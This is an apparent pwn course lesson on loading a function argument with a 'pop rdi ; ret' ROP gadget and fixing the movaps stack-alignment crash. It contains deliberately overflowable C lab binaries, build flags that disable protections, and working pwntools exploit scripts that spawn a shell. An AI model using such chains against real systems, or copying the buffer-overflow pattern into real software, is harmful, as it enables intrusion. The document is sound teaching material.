---
title: "Lesson 3.3: Passing a Function Argument with pop rdi"
image:
  path: /assets/img/covers/pwn-3-3-passing-function-argument-pop-rdi.webp
  alt: "Passing a Function Argument with pop rdi"
date: 2026-10-10 11:15:00 +0700
categories: ["Binary Exploitation", "Pwn · Buffer Overflow"]
tags: [pwn, rop, calling-convention, stack-alignment]
render_with_liquid: false
---

ret2win in the previous lesson jumped into a function that needed no arguments. Life is rarely that simple. Usually the target function needs an argument, `win(0xcafebabe)`, or further out, `system("/bin/sh")`. But at the moment `ret` runs, the RDI register (where the first argument goes) holds garbage. This lesson teaches how to load a value into RDI using a `pop rdi ; ret` gadget, and how to deal with the 16-byte stack alignment trap (movaps) that discourages so many newcomers.

![ROP chain on the stack: pop rdi gadget, argument value, ret for alignment, then win](/assets/img/pwn/pwn-3-3-passing-function-argument-pop-rdi.svg)
_The gadget pops the value right after it into rdi, then its own `ret` jumps into the target function._

**Part:** 3 · **Reading + lab time:** ~55 minutes · **Difficulty:** medium

**Prerequisites:** Lesson 3.2 (ret2win, overwriting saved RIP), Lesson 1.1 (registers), Lesson 2.3 (finding gadgets with ROPgadget).

**Tools:** gcc, gdb + pwndbg, pwntools, ROPgadget.

## Goals

By the end of this lesson you remember the register order for arguments under the System V convention (rdi, rsi, rdx...), you can use a `pop rdi ; ret` gadget to load the first argument then jump into the target function, you understand and can fix the 16-byte stack alignment bug (movaps inside `do_system`) with an extra `ret` gadget, and you know why newer glibc binaries might not ship a `pop rdi` gadget for free and what to do about it.

## Theory

### System V calling convention: arguments live in registers

On Linux x86-64, function arguments are not pushed onto the stack like 32-bit x86, they live in registers, in a fixed order.

```
argument 1 -> rdi
argument 2 -> rsi
argument 3 -> rdx
argument 4 -> rcx
argument 5 -> r8
argument 6 -> r9
(argument 7 onward goes on the stack)
```

So to call `win(0xcafebabe)`, before jumping into `win` you need `rdi == 0xcafebabe`. To call `system("/bin/sh")`, `rdi` needs to point at the string `"/bin/sh"`.

### The problem: at ret time, you don't control registers

When you overflow and `ret`, you only control what sits on the stack. You cannot directly assign `rdi = ...`. The fix is to borrow a piece of code already present in the binary to do it for you.

### The pop rdi ; ret gadget

Look inside the binary for exactly two consecutive instructions.

```asm
pop rdi      ; take 8 bytes off the top of the stack, put them in rdi, rsp goes up by 8
ret          ; jump to whatever comes next on the stack
```

Here is how the stack is laid out.

```
[ address of pop_rdi_ret ]   <- saved RIP, ret jumps here
[ 0xcafebabe             ]   <- pop rdi takes this value into rdi
[ address of win         ]   <- the gadget's own ret jumps here
```

With that layout, the flow goes like this. `vuln`'s `ret` jumps into the gadget. `pop rdi` takes `0xcafebabe` into RDI. The gadget's `ret` jumps into `win`. Now `win` runs with `rdi == 0xcafebabe`. You just passed an argument without ever assigning a register directly. This is the first building block of ROP.

### The 16-byte alignment trap: movaps

This is the part that discourages a lot of people. The x86-64 ABI (binary interface convention) requires that, at the moment a `call` instruction executes, RSP must be a multiple of 16. Many libc functions (including the path `system` takes) use SSE instructions like `movaps xmm, [rsp]`, which require a 16-byte aligned address. If RSP is off (divides 16 with remainder 8), `movaps` raises SIGSEGV.

As you build a ROP chain, every address you push is 8 bytes. Each `ret` pops 8 bytes, shifting RSP by 8 relative to where the function started. As a result, depending on whether your chain has an even or odd number of elements, RSP when `system` starts can be either correctly aligned or off by 8. If it is off, you crash right at `movaps`, even though the payload is "logically correct."

The symptom is distinctive. The target function runs (you see its print statement before it calls system), but then it crashes, no shell. Opening gdb shows a crash at some `movaps %xmm..., (%rsp)` deep inside libc (`do_system`).

The clean fix is to insert one extra `ret` gadget (a single `ret` instruction, doing nothing else) into the chain right before jumping into the target function. One extra `ret` pops 8 more bytes, shifting RSP back by 8, exactly cancelling the misalignment. In other words, add a `ret` to flip the parity of RSP back to a multiple of 16.

### Newer glibc binaries might not ship pop rdi for free

From Ubuntu 22.04 (glibc 2.35) onward, including Ubuntu 24.04 (glibc 2.39) used in this lesson, the function `__libc_csu_init` has been removed. For years that was the place that reliably contained `pop rdi ; ret`. As a consequence, a freshly compiled No PIE binary might no longer have a `pop rdi` gadget in itself (check with ROPgadget, sometimes it comes back empty). When that happens, the options are finding `pop rdi ; ret` inside libc (which requires leaking the libc base first, covered later), or relying on a gadget the challenge has deliberately planted for you. The labs in this series plant a gadget so you can focus on the technique itself.

## Demo

Test environment: Ubuntu 24.04, glibc 2.39, gcc 13.3. Every output below is real. The source, build script, exploit, and transcript are in the Lab section below.

### Sample binary: a target function needing one argument

```c
// callme.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// A deliberately planted gadget (like ROP Emporium does it), since from Ubuntu 22.04
// onward __libc_csu_init was removed, so the binary no longer has its own pop rdi.
__asm__(
    ".global pop_rdi_ret\n"
    ".type pop_rdi_ret, @function\n"
    "pop_rdi_ret:\n"
    "    pop %rdi\n"
    "    ret\n"
);

void win(unsigned long magic) {
    if (magic == 0xdeadbeefcafebabeUL) {
        puts("[+] magic correct. Shell:");
        system("/bin/sh");
    } else {
        printf("[-] wrong magic: 0x%lx\n", magic);
    }
}

void vuln(void) {
    char buf[64];
    puts("Data:");
    read(0, buf, 256);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

Compile it, adding `-fcf-protection=none` so `endbr64` is not inserted at the start of functions, keeping gadgets clean for ROPgadget, exactly as `build.sh` in the Lab section below does it.

```bash
gcc -fno-stack-protector -no-pie -fcf-protection=none -O0 -o callme callme.c
```

### Getting the gadget's address

```
$ ROPgadget --binary ./callme | grep -E "pop rdi|: ret$"
0x0000000000401166 : pop rdi ; ret
0x000000000040101a : ret
```

`pop rdi ; ret` is at `0x401166`, and a bare `ret` at `0x40101a` for alignment. The offset to saved RIP is measured with cyclic as in Lesson 3.2, and for this binary it is 72. The address of `win` comes from `elf.sym['win']` (here `0x401168`).

### Payload: first, deliberately forgetting alignment, to see the trap

```python
from pwn import *
context.binary = elf = ELF('./callme')

pop_rdi = 0x401166
io = process('./callme')
io.recvuntil(b'Data:\n')
io.sendline(flat(
    b'A' * 72,
    pop_rdi, 0xdeadbeefcafebabe,     # load magic into rdi
    elf.sym['win'],                   # jump into win
))
io.sendline(b'id')
print(io.recvall(timeout=2).decode(errors='replace'))
```

It prints `[+] magic correct. Shell:` then goes silent, with no output from `id`. `win` ran (the magic was right), but `system("/bin/sh")` crashed, as seen in a core dump/gdb.

```gdb
Program received signal SIGSEGV
 => 0x7xxxxxxxx43b: movaps %xmm0,0x50(%rsp)     # right before "call posix_spawn"
```

Exactly as theory predicts: a crash at `movaps` because RSP is off by 16. On glibc 2.39, `system()` goes through `do_system` then `posix_spawn`, and the instruction `movaps %xmm0,0x50(%rsp)` right before `call posix_spawn` requires a 16-byte aligned RSP. The exact address changes every run due to libc ASLR (in one real run it landed at `libc_base + 0x5843b`), but the symptom is always the same.

### Payload: add one ret for alignment, get a shell

```python
from pwn import *
context.binary = elf = ELF('./callme')

pop_rdi = 0x401166
ret     = 0x40101a               # a ret gadget to align the stack to 16 bytes

io = process('./callme')
io.recvuntil(b'Data:\n')
io.sendline(flat(
    b'A' * 72,
    pop_rdi, 0xdeadbeefcafebabe,
    ret,                          # one extra ret, pushes RSP back to a multiple of 16
    elf.sym['win'],
))
io.interactive()
```

This is the real output, and the test machine runs as root so uid=0.

```
[+] magic correct. Shell:
$ id
uid=0(root) gid=0(root) groups=0(root)
```

Just one extra `ret` element in the chain turns a crash into a shell. Remember this symptom, the target function runs, then dies right after; think alignment first.

### Tip: let pwntools find the ret gadget for you

If you don't want to copy addresses by hand, use pwntools' ROP module.

```python
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]        # automatically finds a ret gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
```

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 3.3</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/3.3.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/3.3/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/3.3/callme.c" download><i class="fa-solid fa-file-code"></i>callme.c</a>
<a class="lab-file" href="/assets/labs-pwn/3.3/exp_callme.py" download><i class="fa-solid fa-file-code"></i>exp_callme.py</a>
<a class="lab-file" href="/assets/labs-pwn/3.3/exp_callme_nostack.py" download><i class="fa-solid fa-file-code"></i>exp_callme_nostack.py</a>
<a class="lab-file" href="/assets/labs-pwn/3.3/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/3.3/keycheck.c" download><i class="fa-solid fa-file-code"></i>keycheck.c</a>
</div>
</div>

The task uses the `keycheck` binary below, which has `win(code)` and only gives a shell when `code == 0x1337c0de`; pass the correct argument and get a shell. The gadget is already planted.

```c
// keycheck.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__asm__(".global g\n g:\n pop %rdi\n ret\n");    // pop rdi ; ret gadget

void win(unsigned long code) {
    if (code == 0x1337c0deUL) { puts("[+] correct code. Shell:"); system("/bin/sh"); }
    else printf("[-] wrong code: 0x%lx\n", code);
}

void vuln(void) { char buf[72]; puts("code?"); read(0, buf, 200); }

int main(void){ setvbuf(stdout,0,_IONBF,0); vuln(); return 0; }
```

```bash
gcc -fno-stack-protector -no-pie -fcf-protection=none -O0 -o keycheck keycheck.c
```

Here is a skeleton script.

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./keycheck')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

io = process('./keycheck')     # switch to remote when hitting the server
io.recvuntil(b'code?\n')
offset = 0xFIXME               # measure with cyclic
io.sendline(flat(
    b'A'*offset,
    pop_rdi, 0x1337c0de,
    ret,                       # add this if you hit movaps
    elf.sym['win'],
))
io.interactive()
```

Hints, in tiers.

- Hint 1: `buf[72]` but the offset to saved RIP needs to be measured with cyclic, it is not 72 (watch for saved RBP and padding).
- Hint 2: if you see `[+] correct code. Shell:` then it crashes without letting you type a command, that's the movaps trap. Add (or remove) a `ret` gadget before `elf.sym['win']`.
- Hint 3: not sure if you need the ret or not? Try both. Whether you need it depends on whether your chain has an even or odd number of elements. This is a parity issue, not superstition.

The real result, measured and run in the Lab section below on Ubuntu 24.04, glibc 2.39, gcc 13.3, is that the offset for `keycheck` measured with cyclic is **88**, the `pop rdi ; ret` gadget is at `0x401166`, `win` is at `0x401168`, and the bare `ret` is at `0x40101a`. Running `python3 exploit.py` (the chain includes one `ret` for alignment) gives this output.

```
===SHELL_OK===
uid=0(root) gid=0(root) groups=0(root)
```

The full transcript, including the callme demo and the movaps crash, is in the Lab section below.

As a check, try to explain why you sometimes need `ret` and sometimes don't, based on the number of 8-byte elements in the chain.

## Key takeaways

- Arguments: rdi, rsi, rdx, rcx, r8, r9 (System V), argument 1 goes in rdi.
- Load rdi with `pop rdi ; ret`: place [gadget][value][target function] on the stack.
- Target function runs then crashes immediately = think movaps (16-byte alignment).
- Fix it with one extra `ret` gadget to flip RSP's parity back to a multiple of 16.
- Newer glibc binaries might not ship `pop rdi` for free (csu was removed); find one in libc or use a planted challenge gadget.

## Common pitfalls

- Target function runs then dies, no shell: almost always movaps from a misaligned RSP. Add or remove one `ret`. This is the number one trap for newcomers doing ret2libc/ret2win with arguments.
- Adding a `ret` and still crashing: recount the elements in the chain. Every address/value is 8 bytes. Try adding 0 or 1 `ret`, one of the two will be right.
- Finding `pop rdi` comes back empty: a newer glibc binary no longer has that gadget in itself. Check whether the challenge planted one, or wait until you learn libc leaking.
- Wrong order: placing the value before the gadget, or forgetting that `pop rdi` takes the element RIGHT AFTER the gadget's address. The correct order is gadget address, then value, then target function.
- Passing a pointer instead of a value (or the other way around): `win(0xcafebabe)` needs a value in rdi; `system("/bin/sh")` needs rdi to point at the string "/bin/sh" (an address), not the 8 characters "/bin/sh" stuffed directly into rdi.
- Local works, remote fails: if you rely on libc gadgets/addresses, a different libc build shifts the offsets. With a self-contained No PIE binary this rarely happens.

## Further reading

- ROP Emporium, the `split` and `callme` challenges: practice passing arguments.
- The System V AMD64 ABI document, the Parameter Passing section, for the full detail.
- Search "x86-64 stack alignment movaps system" to see how many people have run into this.
